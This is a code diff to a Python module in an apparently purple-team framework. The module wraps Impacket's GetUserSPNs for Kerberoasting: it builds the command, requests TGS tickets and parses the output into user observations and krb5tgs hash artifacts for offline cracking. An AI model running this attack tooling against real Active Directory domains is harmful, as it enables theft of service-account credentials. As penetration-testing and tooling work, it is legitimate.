@@ -4,10 +4,10 @@ Impacket GetUserSPNs Module (Kerberoasting)
 Extract service principal names and request TGS tickets for cracking.
 """
 
-from purplesploit.core.module import ExternalToolModule
+from .common import ImpacketAdapter, observation
 
 
-class ImpacketKerberoastModule(ExternalToolModule):
+class ImpacketKerberoastModule(ImpacketAdapter):
     """
     Impacket GetUserSPNs - Kerberoasting attack.
 
@@ -90,7 +90,9 @@ class ImpacketKerberoastModule(ExternalToolModule):
             }
         })
 
-    def build_command(self) -> str:
+    emits = ("user", "credential", "resource")
+
+    def build_argv(self) -> list[str]:
         """
         Build the impacket-GetUserSPNs command.
 
@@ -98,37 +100,24 @@ class ImpacketKerberoastModule(ExternalToolModule):
             Command string to execute
         """
         rhost = self.get_option("RHOST")
-        username = self.get_option("USERNAME")
-        password = self.get_option("PASSWORD")
-        domain = self.get_option("DOMAIN")
-        hash_val = self.get_option("HASH")
         output_file = self.get_option("OUTPUT_FILE")
-        request = self.get_option("REQUEST")
         dc_ip = self.get_option("DC_IP")
 
         # Build target string
-        if hash_val:
-            target = f"{domain}/{username} -hashes {hash_val}"
-        elif password:
-            target = f"{domain}/{username}:{password}"
-        else:
-            target = f"{domain}/{username}"
-
-        # Base command
-        cmd = f"impacket-GetUserSPNs {target}"
+        cmd = self.authentication_argv(remote=False)
 
         # DC IP
         dc = dc_ip if dc_ip else rhost
         if dc:
-            cmd += f" -dc-ip {dc}"
+            cmd += ["-dc-ip", str(dc)]
 
         # Request TGS tickets
         if self.option_enabled("REQUEST"):
-            cmd += " -request"
+            cmd.append("-request")
 
         # Output file
         if output_file:
-            cmd += f" -outputfile {output_file}"
+            cmd += ["-outputfile", str(output_file)]
 
         return cmd
 
@@ -168,4 +157,16 @@ class ImpacketKerberoastModule(ExternalToolModule):
                 results["tickets"].append(line)
                 results["total_accounts"] += 1
 
+        observations, credentials = self.roast_observations(output, "tgs")
+        results["observations"] = observations
+        for line in results["spns"]:
+            parts = line.split()
+            if line.startswith("$krb5") or len(parts) < 2:
+                continue
+            results["observations"].append(observation(
+                "user", parts[1], username=parts[1], domain=self.get_option("DOMAIN"), spn=parts[0]))
+        results["credentials"] = credentials
+        results["artifacts"] = [{"type": "hash", "hash_type": "krb5tgs", "value": value}
+                                for value in results["tickets"]]
+        results["success"] = results["success"] or bool(results["tickets"])
         return results
